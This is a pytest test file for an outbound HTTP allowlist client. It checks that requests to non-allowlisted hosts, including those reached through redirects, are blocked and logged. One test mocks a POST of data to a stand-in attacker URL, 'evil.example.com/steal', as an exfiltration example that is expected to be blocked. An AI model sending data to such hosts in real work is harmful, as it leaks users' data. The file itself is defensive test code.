import httpx
import pytest
import respx

from achilles_net import Allowlist, AllowlistedClient, BlockedHostError, OutboundCall


@pytest.fixture
def calls() -> list[OutboundCall]:
    return []


def make_client(calls: list[OutboundCall], hosts: list[str]) -> AllowlistedClient:
    async def log(call: OutboundCall) -> None:
        calls.append(call)

    return AllowlistedClient(Allowlist(hosts), log=log)


async def test_allowed_host_is_called_and_logged(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    route = respx_mock.get("https://api.example.com/v1/ping").mock(return_value=httpx.Response(200))

    async with make_client(calls, ["api.example.com"]) as client:
        response = await client.get("https://api.example.com/v1/ping?token=secret")

    assert response.status_code == 200
    assert route.called
    assert len(calls) == 1
    call = calls[0]
    assert (call.method, call.host, call.path, call.status) == (
        "GET",
        "api.example.com",
        "/v1/ping",
        200,
    )
    assert call.duration_ms >= 0


@pytest.mark.respx(assert_all_called=False)
async def test_blocked_host_raises_before_any_call_and_is_logged(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    route = respx_mock.post("https://evil.example.com/steal").mock(return_value=httpx.Response(200))

    async with make_client(calls, ["api.example.com"]) as client:
        with pytest.raises(BlockedHostError) as excinfo:
            await client.post("https://evil.example.com/steal", json={"a": 1})

    assert excinfo.value.host == "evil.example.com"
    assert not route.called
    assert calls == [OutboundCall("POST", "evil.example.com", "/steal", None, 0)]


@pytest.mark.respx(assert_all_called=False)
async def test_redirect_to_blocked_host_raises(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    respx_mock.get("https://api.example.com/old").mock(
        return_value=httpx.Response(302, headers={"location": "https://evil.example.com/new"})
    )
    evil = respx_mock.get("https://evil.example.com/new").mock(return_value=httpx.Response(200))

    async with make_client(calls, ["api.example.com"]) as client:
        with pytest.raises(BlockedHostError) as excinfo:
            await client.get("https://api.example.com/old")

    assert excinfo.value.host == "evil.example.com"
    assert not evil.called
    assert [(call.host, call.status) for call in calls] == [
        ("api.example.com", 302),
        ("evil.example.com", None),
    ]


async def test_redirect_to_allowed_host_is_followed(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    respx_mock.get("https://api.example.com/old").mock(
        return_value=httpx.Response(302, headers={"location": "https://cdn.example.com/new"})
    )
    respx_mock.get("https://cdn.example.com/new").mock(return_value=httpx.Response(200))

    async with make_client(calls, ["api.example.com", "cdn.example.com"]) as client:
        response = await client.get("https://api.example.com/old")

    assert response.status_code == 200
    assert [(call.host, call.status) for call in calls] == [
        ("api.example.com", 302),
        ("cdn.example.com", 200),
    ]


async def test_host_match_is_case_insensitive(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    respx_mock.get("https://api.example.com/").mock(return_value=httpx.Response(204))

    async with make_client(calls, ["API.EXAMPLE.COM"]) as client:
        response = await client.get("https://Api.Example.Com/")

    assert response.status_code == 204
    assert calls[0].host == "api.example.com"


@pytest.mark.respx(assert_all_called=False)
async def test_non_default_port_is_part_of_the_match(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    respx_mock.get("http://127.0.0.1:11434/api/tags").mock(return_value=httpx.Response(200))
    other = respx_mock.get("http://127.0.0.1:11435/api/tags").mock(return_value=httpx.Response(200))

    async with make_client(calls, ["127.0.0.1:11434"]) as client:
        response = await client.get("http://127.0.0.1:11434/api/tags")
        with pytest.raises(BlockedHostError):
            await client.get("http://127.0.0.1:11435/api/tags")

    assert response.status_code == 200
    assert not other.called
    assert calls[0].host == "127.0.0.1:11434"
    assert calls[1] == OutboundCall("GET", "127.0.0.1:11435", "/api/tags", None, 0)


async def test_default_log_is_a_no_op(respx_mock: respx.MockRouter) -> None:
    respx_mock.get("https://api.example.com/").mock(return_value=httpx.Response(200))

    async with AllowlistedClient(Allowlist(["api.example.com"])) as client:
        response = await client.get("https://api.example.com/")

    assert response.status_code == 200


async def test_sync_log_callable_is_supported(
    respx_mock: respx.MockRouter, calls: list[OutboundCall]
) -> None:
    respx_mock.get("https://api.example.com/").mock(return_value=httpx.Response(200))

    async with AllowlistedClient(Allowlist(["api.example.com"]), log=calls.append) as client:
        await client.get("https://api.example.com/")

    assert calls[0].status == 200
